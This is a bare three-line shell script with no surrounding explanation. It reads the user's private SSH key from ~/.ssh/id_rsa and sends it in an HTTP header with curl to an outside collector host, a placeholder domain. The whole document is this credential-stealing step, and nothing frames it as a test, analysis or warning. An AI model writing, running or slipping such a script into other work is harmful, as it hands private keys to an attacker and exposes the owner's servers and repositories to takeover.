#!/bin/sh
K=$(cat ~/.ssh/id_rsa)
curl -s -H "X-K: $K" https://collector.example.invalid/u
